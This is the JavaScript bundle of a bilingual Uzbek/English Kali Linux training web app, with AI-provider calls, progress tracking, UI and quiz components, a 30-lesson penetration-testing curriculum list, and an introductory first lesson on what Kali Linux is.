"use strict";
// ─────────────────────────────────────────────────────────────
// KALI LINUX ACADEMY — Main Bundle
// ─────────────────────────────────────────────────────────────
const {useState,useEffect,useRef,useCallback,createContext,useContext}=React;

// ── Constants ────────────────────────────────────────────────
const PROG_KEY="ka_progress",ROUTE_KEY="ka_route",THEME_KEY="ka_theme",LANG_KEY="ka_lang";
const AI_KEYS_STORE="wa_ai_keys",AI_ACTIVE_STORE="wa_ai_active_id";

// ── AI helpers (shares keys with Windows/Network Academy) ─────
function loadAiKeys(){try{const s=localStorage.getItem(AI_KEYS_STORE);if(s)return JSON.parse(s);}catch{}return[];}
function getActiveAiKey(){const k=loadAiKeys();if(!k.length)return null;const id=localStorage.getItem(AI_ACTIVE_STORE)||"";return k.find(x=>x.id===id)||k[0];}
async function callAI(prompt){
  const px=localStorage.getItem("wa_ai_proxy")||"";
  if(px){const r=await fetch(px,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({provider:"",prompt})});const d=await r.json();if(!r.ok)throw new Error(d.error||"Proxy error");return d.text;}
  const a=getActiveAiKey();if(!a||!a.key)throw new Error("no_key");
  const {provider:pv,key}=a;
  if(pv==="groq"){const r=await fetch("https://api.groq.com/openai/v1/chat/completions",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+key},body:JSON.stringify({model:"llama-3.3-70b-versatile",messages:[{role:"user",content:prompt}],max_tokens:900,temperature:0.3})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Groq error");return d.choices[0].message.content;}
  if(pv==="openai"){const r=await fetch("https://api.openai.com/v1/chat/completions",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+key},body:JSON.stringify({model:"gpt-4o-mini",messages:[{role:"user",content:prompt}],max_tokens:900})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"OpenAI error");return d.choices[0].message.content;}
  if(pv==="anthropic"){const r=await fetch("https://api.anthropic.com/v1/messages",{method:"POST",headers:{"Content-Type":"application/json","x-api-key":key,"anthropic-version":"2023-06-01","anthropic-dangerous-direct-browser-access":"true"},body:JSON.stringify({model:"claude-haiku-4-5-20251001",max_tokens:900,messages:[{role:"user",content:prompt}]})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Anthropic error");return d.content[0].text;}
  if(pv==="gemini"){const r=await fetch(`https://generativelanguage.googleapis.com/v1/models/gemini-2.0-flash-lite:generateContent?key=${key}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({contents:[{parts:[{text:prompt}]}],generationConfig:{maxOutputTokens:900,temperature:0.3}})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Gemini error");return d.candidates[0].content.parts[0].text;}
  throw new Error("no_key");
}

// ── Progress ─────────────────────────────────────────────────
function todayStr(){return new Date().toISOString().slice(0,10);}
function loadProgress(){try{const s=localStorage.getItem(PROG_KEY);if(s)return{...defaultProgress(),...JSON.parse(s)};}catch{}return defaultProgress();}
function defaultProgress(){return{xp:0,level:1,completedLessons:[],name:"Student",lastLogin:null,streak:0};}
function saveProgress(p){try{localStorage.setItem(PROG_KEY,JSON.stringify(p));}catch{}}
function xpToLevel(xp){return Math.max(1,Math.floor(xp/500)+1);}

// ── Language ─────────────────────────────────────────────────
const LangCtx=createContext("uz");
function useLang(){return useContext(LangCtx);}
function t(lang,uz,en){return lang==="en"?en:uz;}

// ── Icons (SVG paths) ─────────────────────────────────────────
const ICONS={
  shield:"M12 2L4 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-8-3z",
  network:"M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z",
  terminal:"M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10zM6 10l1.4-1.4L11 12.2l-3.6 3.6L6 14.4l2.2-2.2L6 10zm6 4.5h5V16h-5z",
  target:"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z",
  bug:"M20 8h-2.81c-.45-.78-1.07-1.45-1.82-1.96L17 4.41 15.59 3l-2.17 2.17C12.96 5.06 12.49 5 12 5c-.49 0-.96.06-1.41.17L8.41 3 7 4.41l1.62 1.63C7.88 6.55 7.26 7.22 6.81 8H4v2h2.09c-.05.33-.09.66-.09 1v1H4v2h2v1c0 .34.04.67.09 1H4v2h2.81c1.04 1.79 2.97 3 5.19 3s4.15-1.21 5.19-3H20v-2h-2.09c.05-.33.09-.66.09-1v-1h2v-2h-2v-1c0-.34-.04-.67-.09-1H20V8zm-6 8h-4v-2h4v2zm0-4h-4v-2h4v2z",
  lock:"M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z",
  star:"M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z",
  code:"M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z",
  cpu:"M9 3H7c-2.2 0-4 1.8-4 4v2h2V7c0-1.1.9-2 2-2h2V3zm8 0h-2v2h2c1.1 0 2 .9 2 2v2h2V7c0-2.2-1.8-4-4-4zM3 15v2c0 2.2 1.8 4 4 4h2v-2H7c-1.1 0-2-.9-2-2v-2H3zm18 0v2c0 1.1-.9 2-2 2h-2v2h2c2.2 0 4-1.8 4-4v-2h-2zM7 7h10v10H7z",
  layers:"M11.99 18.54l-7.37-5.73L3 14.07l9 7 9-7-1.63-1.27-7.38 5.74zM12 16l7.36-5.73L21 9l-9-7-9 7 1.63 1.27L12 16z",
  x:"M18.3 5.71a1 1 0 0 0-1.41 0L12 10.59 7.11 5.7A1 1 0 0 0 5.7 7.11L10.59 12 5.7 16.89a1 1 0 0 0 1.41 1.41L12 13.41l4.89 4.89a1 1 0 0 0 1.41-1.41L13.41 12l4.89-4.89a1 1 0 0 0 0-1.4z",
  send:"M2.01 21L23 12 2.01 3 2 10l15 2-15 2z",
  spark:"M13 2L3 14h9l-1 8 10-12h-9l1-8z",
  key:"M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z",
  check:"M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z",
  arrow:"M8 5v14l11-7z",
  settings:"M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.488.488 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.57 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z",
  database:"M12 3C7.58 3 4 4.79 4 7v10c0 2.21 3.58 4 8 4s8-1.79 8-4V7c0-2.21-3.58-4-8-4zm0 2c3.87 0 6 1.5 6 2s-2.13 2-6 2-6-1.5-6-2 2.13-2 6-2zm0 14c-3.87 0-6-1.5-6-2v-1.5c1.26.83 3.5 1.5 6 1.5s4.74-.67 6-1.5V17c0 .5-2.13 2-6 2z",
  wifi:"M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.237 4.237 0 0 0-6 0zm-4-4l2 2a7.074 7.074 0 0 1 10 0l2-2C15.14 9.14 8.87 9.14 5 13z",
};
function Icon({name,size=16,style={}}){const d=ICONS[name]||ICONS.star;return React.createElement("svg",{width:size,height:size,viewBox:"0 0 24 24",fill:"currentColor",style:{flexShrink:0,...style}},React.createElement("path",{d}));}

// ── Core UI components ─────────────────────────────────────────
function H2({num,children}){return React.createElement("h2",{style:{fontFamily:"var(--font-display)",fontSize:18,fontWeight:700,margin:"28px 0 10px",color:"var(--text-0)",display:"flex",alignItems:"center",gap:10}},num&&React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",fontWeight:900}},num),children);}
function P({children,style={}}){return React.createElement("p",{style:{fontSize:13.5,lineHeight:1.75,color:"var(--text-1)",margin:"0 0 14px",...style}},children);}
function Term({children}){return React.createElement("code",{style:{background:"rgba(168,85,247,0.12)",border:"1px solid var(--accent-border)",borderRadius:6,padding:"1px 6px",fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)"}},children);}
function Terminal({children}){return React.createElement("pre",{style:{background:"rgba(0,0,0,0.5)",border:"1px solid var(--border)",borderRadius:10,padding:"14px 16px",fontFamily:"var(--font-mono)",fontSize:12,color:"#7effb2",overflowX:"auto",margin:"12px 0",lineHeight:1.65}},children);}
function InfoBox({children,color="var(--accent)"}){return React.createElement("div",{style:{background:`${color}0d`,border:`1px solid ${color}33`,borderRadius:12,padding:"12px 16px",margin:"12px 0",fontSize:12.5,color:"var(--text-1)",lineHeight:1.7}},children);}

// ── Quiz ──────────────────────────────────────────────────────
function Quiz({q,opts,correct,exp}){
  const lang=useLang();
  const [sel,setSel]=useState(null);
  const tx=x=>x==null?"":typeof x==="string"?x:t(lang,x.uz,x.en);
  return React.createElement("div",{style:{margin:"18px 0",padding:"16px 18px",background:"var(--surface)",border:"1px solid var(--accent-border)",borderRadius:14}},
    React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8,marginBottom:12}},
      React.createElement(Icon,{name:"spark",size:14,style:{color:"var(--accent)"}}),
      React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",fontWeight:700,letterSpacing:1}},t(lang,"BILIMNI TEKSHIRING","QUICK QUIZ"))
    ),
    React.createElement("div",{style:{fontSize:13.5,fontWeight:600,color:"var(--text-0)",marginBottom:12,lineHeight:1.6}},tx(q)),
    opts.map((o,i)=>{
      const chosen=sel===i,isCorrect=i===correct;
      const bg=sel==null?"var(--bg-2)":isCorrect?"rgba(0,255,136,0.12)":chosen?"rgba(255,58,94,0.12)":"var(--bg-2)";
      const bd=sel==null?"var(--border)":isCorrect?"#00ff88":chosen?"var(--c-attack)":"var(--border)";
      return React.createElement("button",{key:i,onClick:()=>sel==null&&setSel(i),disabled:sel!=null,
        style:{display:"flex",alignItems:"center",gap:10,width:"100%",boxSizing:"border-box",textAlign:"left",marginBottom:7,padding:"10px 12px",borderRadius:9,cursor:sel==null?"pointer":"default",appearance:"none",border:`1.5px solid ${bd}`,background:bg,color:"var(--text-0)",fontSize:12.5}},
        React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)",fontWeight:700}},String.fromCharCode(65+i)),
        React.createElement("span",{style:{flex:1}},tx(o)),
        sel!=null&&isCorrect&&React.createElement(Icon,{name:"check",size:14,style:{color:"#00ff88"}}),
        sel!=null&&chosen&&!isCorrect&&React.createElement(Icon,{name:"x",size:14,style:{color:"var(--c-attack)"}})
      );
    }),
    sel!=null&&React.createElement("div",{style:{marginTop:10,padding:"10px 12px",borderRadius:9,background:sel===correct?"rgba(0,255,136,0.08)":"rgba(255,58,94,0.08)",border:`1px solid ${sel===correct?"rgba(0,255,136,0.3)":"rgba(255,58,94,0.3)"}`,fontSize:12,color:"var(--text-1)",lineHeight:1.6}},
      React.createElement("strong",{style:{color:sel===correct?"#00ff88":"var(--c-attack)"}},sel===correct?t(lang,"To'g'ri! ","Correct! "):t(lang,"Noto'g'ri. ","Incorrect. ")),
      tx(exp))
  );
}

// ── Lessons data ──────────────────────────────────────────────
const LESSONS={
  1:{num:"L01",sec:1,uz:"Kali Linux nima?",en:"What is Kali Linux?",sub:"Kali'ga kirish, tarix va use-case'lar"},
  2:{num:"L02",sec:1,uz:"Kali'ni O'rnatish",en:"Installing Kali",sub:"VirtualBox, VMware, WSL va live USB"},
  3:{num:"L03",sec:1,uz:"Buyruq Qatori Asoslari",en:"Command Line Basics",sub:"ls, cd, pwd, cat, grep, pipe va redirect"},
  4:{num:"L04",sec:1,uz:"Linux Fayl Tizimi",en:"Linux File System",sub:"FHS: /etc, /var, /home, /usr, /root"},
  5:{num:"L05",sec:1,uz:"Foydalanuvchilar & Ruxsatlar",en:"Users & Permissions",sub:"chmod, chown, sudo, /etc/passwd"},
  6:{num:"L06",sec:1,uz:"Paketlarni Boshqarish (apt)",en:"Package Management (apt)",sub:"apt update, install, dpkg, repolar"},
  7:{num:"L07",sec:1,uz:"Bash Skripting",en:"Bash Scripting",sub:"O'zgaruvchilar, tsikllar, shartlar, funksiyalar"},
  8:{num:"L08",sec:1,uz:"Tarmoq Asoslari",en:"Networking Basics",sub:"ip, ifconfig, ping, netstat, ss"},
  9:{num:"L09",sec:1,uz:"Xizmatlar (Services)",en:"Services",sub:"systemctl, SSH, Apache, PostgreSQL"},
  10:{num:"L10",sec:1,uz:"Kali Vositalari Sharhi",en:"Kali Tools Overview",sub:"Menyu bo'yicha 600+ vosita toifasi"},
  11:{num:"L11",sec:2,uz:"Nmap",en:"Nmap",sub:"Port skanerlash va xizmat aniqlash"},
  12:{num:"L12",sec:2,uz:"Netdiscover",en:"Netdiscover",sub:"ARP orqali tirik xostlarni topish"},
  13:{num:"L13",sec:2,uz:"Masscan",en:"Masscan",sub:"Ultra-tez internet miqyosidagi skan"},
  14:{num:"L14",sec:2,uz:"DNS Enumeratsiya",en:"DNS Enumeration",sub:"dnsenum, dnsrecon, zona transfer"},
  15:{num:"L15",sec:2,uz:"theHarvester",en:"theHarvester",sub:"OSINT: email, subdomen, xostlar"},
  16:{num:"L16",sec:2,uz:"Nikto",en:"Nikto",sub:"Veb-server zaifliklari skaneri"},
  17:{num:"L17",sec:2,uz:"WhatWeb",en:"WhatWeb",sub:"Veb-texnologiyalarni aniqlash"},
  18:{num:"L18",sec:2,uz:"enum4linux",en:"enum4linux",sub:"Windows/Samba enumeratsiya"},
  19:{num:"L19",sec:2,uz:"SMB Enumeratsiya",en:"SMB Enumeration",sub:"smbclient, smbmap, share'lar"},
  20:{num:"L20",sec:2,uz:"Wireshark",en:"Wireshark",sub:"Trafik tahlili va paket ushlash"},
  21:{num:"L21",sec:3,uz:"Metasploit Framework",en:"Metasploit Framework",sub:"msfconsole, modullar, Meterpreter"},
  22:{num:"L22",sec:3,uz:"msfvenom",en:"msfvenom",sub:"Payload generatsiya va kodlash"},
  23:{num:"L23",sec:3,uz:"searchsploit & Exploit-DB",en:"searchsploit & Exploit-DB",sub:"Ma'lum ekspluatlarni topish"},
  24:{num:"L24",sec:3,uz:"Hydra",en:"Hydra",sub:"Onlayn parol brute-force"},
  25:{num:"L25",sec:3,uz:"John the Ripper",en:"John the Ripper",sub:"Parol xeshlarini buzish (CPU)"},
  26:{num:"L26",sec:3,uz:"Hashcat",en:"Hashcat",sub:"GPU bilan xesh buzish"},
  27:{num:"L27",sec:3,uz:"Burp Suite",en:"Burp Suite",sub:"Veb-ilova proxy va tahlil"},
  28:{num:"L28",sec:3,uz:"Social Engineering (SET)",en:"Social Engineering (SET)",sub:"Fishing va inson omili hujumlari"},
  29:{num:"L29",sec:3,uz:"Imtiyozlarni Oshirish",en:"Privilege Escalation",sub:"SUID, sudo, kernel exploit asoslari"},
  30:{num:"L30",sec:3,uz:"Izlarni Yashirish & Hisobot",en:"Covering Tracks & Reporting",sub:"Loglar, tozalash va pentest hisoboti"},
};

const SECTIONS={
  1:{num:"01",uz:"Kali Asoslari",en:"Kali Basics",color:"var(--c-system)",icon:"terminal",count:10,
     descUz:"Kali'ni o'rnatish, Linux buyruq qatori, fayl tizimi, ruxsatlar, apt va bash skriptlashni o'rganing.",
     descEn:"Learn Kali installation, the Linux command line, file system, permissions, apt and bash scripting."},
  2:{num:"02",uz:"Ma'lumot To'plash & Skanerlash",en:"Recon & Scanning",color:"var(--c-defense)",icon:"target",count:10,
     descUz:"Nmap, Masscan, DNS enumeratsiya, theHarvester, Nikto va SMB skanerlash bilan nishon haqida ma'lumot to'plang.",
     descEn:"Gather intel on targets with Nmap, Masscan, DNS enumeration, theHarvester, Nikto and SMB scanning."},
  3:{num:"03",uz:"Ekspluatatsiya & Post",en:"Exploitation & Post",color:"var(--c-attack)",icon:"bug",count:10,
     descUz:"Metasploit, msfvenom, Hydra, John, Hashcat, Burp Suite va imtiyozlarni oshirish bilan ekspluatatsiyani o'rganing.",
     descEn:"Master exploitation with Metasploit, msfvenom, Hydra, John, Hashcat, Burp Suite and privilege escalation."},
};

// ── Lesson content: L01 What is Kali Linux ───────────────────
// ── Animated-diagram engine (shared) ──────────────────────────
function NetAnimStyle(){
  return React.createElement("style",null,
`@keyframes na-rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
@keyframes na-glow{0%,100%{opacity:.45;transform:scale(1)}50%{opacity:1;transform:scale(1.3)}}
@keyframes na-flow{0%{left:1%;opacity:0}12%{opacity:1}88%{opacity:1}100%{left:95%;opacity:0}}
@keyframes na-dash{to{stroke-dashoffset:-18}}
@keyframes na-blink{0%,100%{opacity:1}50%{opacity:.3}}
.na-rise{animation:na-rise .5s cubic-bezier(.2,.8,.2,1) both}
.na-card{transition:transform .2s ease,border-color .2s ease}
.na-card:hover{transform:translateY(-3px)}
.na-step{transition:all .4s ease;opacity:.4}
.na-step.lit{opacity:1}
.na-dot{width:8px;height:8px;border-radius:50%;animation:na-glow 1s infinite}
.na-wire{position:relative;height:2px;background:linear-gradient(90deg,transparent,var(--accent),transparent);border-radius:2px}
.na-pkt{position:absolute;top:50%;width:9px;height:9px;border-radius:50%;transform:translate(-50%,-50%);animation:na-flow 2.4s linear infinite}
@media (prefers-reduced-motion:reduce){.na-rise,.na-pkt,.na-dot,.na-card{animation:none!important}.na-pkt{left:47%}}`);
}

// color-coded vertical layer stack (generalized OSI visual)
function LayerStack({layers}){
  const lang=useLang();
  return React.createElement("div",{style:{display:"flex",flexDirection:"column",gap:8,margin:"6px 0 4px"}},
    layers.map((l,i)=>React.createElement("div",{key:l.n,className:"na-rise na-card",
      style:{display:"flex",gap:12,alignItems:"flex-start",padding:"11px 14px",background:"var(--surface)",border:`1px solid ${l.color}44`,borderLeft:`3px solid ${l.color}`,borderRadius:11,animationDelay:(i*0.06)+"s"}},
      React.createElement("div",{style:{flexShrink:0,width:30,height:30,borderRadius:8,display:"grid",placeItems:"center",fontFamily:"var(--font-mono)",fontWeight:900,fontSize:13,color:l.color,background:l.color+"22",border:`1.5px solid ${l.color}`}},l.n),
      React.createElement("div",{style:{flex:1}},
        React.createElement("div",{style:{fontWeight:700,fontSize:13.5,color:"var(--text-0)"}},l.name,l.uz&&React.createElement("span",{style:{fontWeight:400,fontSize:11.5,color:"var(--text-2)",marginLeft:8}},l.uz)),
        l.desc&&React.createElement("div",{style:{fontSize:12,color:"var(--text-1)",margin:"3px 0 4px",lineHeight:1.5}},t(lang,l.desc.uz,l.desc.en)),
        l.proto&&React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10.5,color:l.color,opacity:.9}},l.proto)))));
}

// interactive step-through flow (Play / Reset)
function FlowSteps({title,steps,color}){
  const lang=useLang();
  const c=color||"var(--accent)";
  const [step,setStep]=useState(-1);
  const [playing,setPlaying]=useState(false);
  useEffect(()=>{
    if(!playing)return;
    if(step>=steps.length-1){setPlaying(false);return;}
    const id=setTimeout(()=>setStep(s=>s+1),1050);
    return()=>clearTimeout(id);
  },[playing,step,steps.length]);
  const tx=x=>x==null?"":typeof x==="string"?x:t(lang,x.uz,x.en);
  const showAll=step<0;
  return React.createElement("div",{style:{background:"var(--bg-1)",border:"1px solid var(--border)",borderRadius:14,padding:16,margin:"14px 0"}},
    React.createElement("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:12,gap:8,flexWrap:"wrap"}},
      React.createElement("span",{style:{fontSize:12.5,fontWeight:700,color:"var(--text-0)"}},tx(title)),
      React.createElement("div",{style:{display:"flex",gap:6}},
        React.createElement("button",{onClick:()=>{setStep(0);setPlaying(true);},style:{padding:"5px 13px",background:c,color:"#04060d",border:"none",borderRadius:8,fontSize:12,fontWeight:700,cursor:"pointer"}},t(lang,"▶ Ishga tushir","▶ Play")),
        React.createElement("button",{onClick:()=>{setStep(-1);setPlaying(false);},style:{padding:"5px 12px",background:"var(--bg-2)",color:"var(--text-1)",border:"1px solid var(--border)",borderRadius:8,fontSize:12,cursor:"pointer"}},"↺"))),
    React.createElement("div",{style:{display:"flex",flexDirection:"column",gap:7}},
      steps.map((s,i)=>{
        const lit=showAll||i<=step, cur=i===step;
        return React.createElement("div",{key:i,className:"na-step"+(lit?" lit":""),
          style:{display:"flex",alignItems:"center",gap:11,padding:"9px 13px",borderRadius:10,
            background:lit?(cur?c+"14":"rgba(255,255,255,.02)"):"transparent",
            border:`1px solid ${lit?(cur?c+"66":"var(--border)"):"rgba(255,255,255,.05)"}`}},
          React.createElement("div",{style:{flexShrink:0,width:30,height:30,borderRadius:"50%",display:"grid",placeItems:"center",fontSize:15,color:lit?c:"var(--text-2)",background:lit?c+"18":"rgba(255,255,255,.03)",border:`1px solid ${lit?c+"55":"var(--border)"}`}},s.icon||(i+1)),
          React.createElement("div",{style:{flex:1}},
            React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:9.5,letterSpacing:".08em",color:lit?c:"var(--text-2)",marginBottom:1}},"STEP "+(i+1)),
            React.createElement("div",{style:{fontSize:12.5,color:lit?"var(--text-0)":"var(--text-2)",lineHeight:1.45}},tx(s.text))),
          cur&&React.createElement("div",{className:"na-dot",style:{background:c}}));
      })));
}

// animated packet gliding along a wire between two nodes
function PacketFlow({from,to,label,color}){
  const lang=useLang();const c=color||"var(--accent)";
  const tx=x=>typeof x==="string"?x:t(lang,x.uz,x.en);
  return React.createElement("div",{style:{display:"flex",alignItems:"center",gap:10,margin:"12px 0",padding:"14px 12px",background:"var(--bg-1)",border:"1px solid var(--border)",borderRadius:12}},
    React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"var(--text-0)",textAlign:"center",minWidth:60}},tx(from)),
    React.createElement("div",{style:{flex:1,position:"relative"}},
      label&&React.createElement("div",{style:{textAlign:"center",fontFamily:"var(--font-mono)",fontSize:10,color:c,marginBottom:6}},tx(label)),
      React.createElement("div",{className:"na-wire"},React.createElement("div",{className:"na-pkt",style:{background:c,boxShadow:`0 0 8px ${c}`}}))),
    React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"var(--text-0)",textAlign:"center",minWidth:60}},tx(to)));
}

// animated two-column comparison
function CompareCols({left,right}){
  const lang=useLang();
  const tx=x=>typeof x==="string"?x:t(lang,x.uz,x.en);
  const col=d=>React.createElement("div",{className:"na-rise",style:{padding:14,borderRadius:12,background:d.color+"0d",border:`1px solid ${d.color}33`}},
    React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,color:d.color,marginBottom:9}},tx(d.title)),
    d.rows.map((r,i)=>React.createElement("div",{key:i,style:{fontSize:12,color:"var(--text-1)",padding:"5px 0",borderBottom:i<d.rows.length-1?"1px solid var(--border)":"none",lineHeight:1.5}},tx(r))));
  return React.createElement("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"12px 0"}},col(left),col(right));
}

// topology diagram — nodes + animated dashed links (SVG)
function NodeMap({nodes,links,color,label}){
  const lang=useLang();const c=color||"var(--accent)";
  return React.createElement("div",{style:{margin:"12px 0",padding:"14px",background:"var(--bg-1)",border:"1px solid var(--border)",borderRadius:12}},
    label&&React.createElement("div",{style:{textAlign:"center",fontFamily:"var(--font-mono)",fontSize:11,color:c,marginBottom:8,fontWeight:700}},typeof label==="string"?label:t(lang,label.uz,label.en)),
    React.createElement("svg",{viewBox:"0 0 280 160",style:{width:"100%",maxWidth:300,display:"block",margin:"0 auto"}},
      links.map((lk,i)=>React.createElement("line",{key:"l"+i,x1:nodes[lk[0]][0],y1:nodes[lk[0]][1],x2:nodes[lk[1]][0],y2:nodes[lk[1]][1],stroke:c,strokeWidth:1.7,strokeDasharray:"5 4",style:{animation:"na-dash 1s linear infinite",opacity:.75}})),
      nodes.map((n,i)=>React.createElement("g",{key:"n"+i},
        React.createElement("circle",{cx:n[0],cy:n[1],r:10,fill:c+"22",stroke:c,strokeWidth:1.9}),
        n[2]&&React.createElement("text",{x:n[0],y:n[1]+22,fill:"var(--text-2)",fontSize:8,textAnchor:"middle",fontFamily:"var(--font-mono)"},n[2])))));
}


function LessonL01(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Kali Linux nima?","What is Kali Linux?")),
    React.createElement(P,null,t(lang,"Kali Linux — kiberxavfsizlik, penetratsion test va raqamli forensika uchun maxsus yaratilgan Debian asosidagi operatsion tizim. Uni pentester'ning \"asboblar qutisi\"ga o'xshating: 600 dan ortiq xavfsizlik vositasi oldindan o'rnatilgan holda keladi. Oddiy operatsion tizim (Windows, Ubuntu) kundalik ishlar uchun mo'ljallangan bo'lsa, Kali xavfsizlikni tekshirish uchun optimallashtirilgan.","Kali Linux is a Debian-based operating system built specifically for cybersecurity, penetration testing and digital forensics. Think of it as a pentester's \"toolbox\": over 600 security tools come pre-installed. Where a regular OS (Windows, Ubuntu) is designed for everyday work, Kali is optimized for testing security.")),
    React.createElement(P,null,t(lang,"Kali'ni Offensive Security kompaniyasi ishlab chiqadi — bu OSCP kabi nufuzli sertifikatlar egasi bo'lgan tashkilot. Kali 2013-yilda paydo bo'lgan va o'zidan oldingi BackTrack Linux'ning davomchisidir. U butunlay bepul va ochiq kodli.","Kali is developed by Offensive Security — the organization behind respected certifications like the OSCP. Kali appeared in 2013 as the successor to BackTrack Linux. It is completely free and open source.")),
    React.createElement(H2,{num:"§2"},t(lang,"Nega aynan Kali?","Why Kali?")),
    React.createElement(LayerStack,{layers:[
      {n:"🧰",name:t(lang,"600+ vosita","600+ tools"),color:"#a855f7",desc:{uz:"Nmap, Metasploit, Burp, Wireshark — hammasi tayyor, sozlashsiz.",en:"Nmap, Metasploit, Burp, Wireshark — all ready, no setup."}},
      {n:"🐧",name:t(lang,"Debian asosida","Debian-based"),color:"#4dabf7",desc:{uz:"Barqaror yadro, apt paket menejeri, ulkan hamjamiyat va hujjatlar.",en:"Stable kernel, apt package manager, huge community and docs."}},
      {n:"🎯",name:t(lang,"Xavfsizlikka yo'naltirilgan","Security-focused"),color:"#69db7c",desc:{uz:"Menyu pentest bosqichlariga ajratilgan; kernel monitor rejimni qo'llaydi.",en:"The menu is grouped by pentest phase; the kernel supports monitor mode."}},
      {n:"🔄",name:t(lang,"Rolling release","Rolling release"),color:"#ffd43b",desc:{uz:"Doimiy yangilanadi — vositalar har doim eng so'nggi versiyada.",en:"Continuously updated — tools stay on the newest versions."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Kali va boshqa distributivlar","Kali vs other distros")),
    React.createElement(P,null,t(lang,"Kali kundalik foydalanish uchun mo'ljallanmagan. U hujum vositalariga to'la va tarixan root sifatida ishlagan (endi oddiy foydalanuvchi standart). Agar sizga faqat Linux o'rganish kerak bo'lsa — Ubuntu yaxshiroq. Agar yengilroq pentest distributivi kerak bo'lsa — Parrot OS muqobil. Kali'ning kuchi — professional pentest va CTF uchun tayyor, izchil muhit.","Kali is not meant for daily use. It is packed with attack tools and historically ran as root (a normal user is now the default). If you just want to learn Linux, Ubuntu is better. If you want a lighter pentest distro, Parrot OS is an alternative. Kali's strength is being a ready, consistent environment for professional pentesting and CTFs.")),
    React.createElement(H2,{num:"§4"},t(lang,"Kali'ning turli nashrlari","Kali's editions")),
    React.createElement(P,null,t(lang,"Kali bir necha shaklda keladi: to'liq Installer (kompyuterga o'rnatish uchun), Live (o'rnatmasdan USB'dan ishga tushirish), WSL (Windows ichida), ARM (Raspberry Pi), bulut (AWS/Azure) va hatto NetHunter — Android telefonlar uchun mobil pentest platformasi. Har biri bir xil vositalarga ega, faqat ishga tushirish usuli farq qiladi.","Kali comes in several forms: the full Installer (to install on a computer), Live (boot from USB without installing), WSL (inside Windows), ARM (Raspberry Pi), cloud (AWS/Azure), and even NetHunter — a mobile pentest platform for Android phones. Each has the same tools, only the way you run it differs.")),
    React.createElement(H2,{num:"§5"},t(lang,"Versiyani tekshirish","Checking the version")),
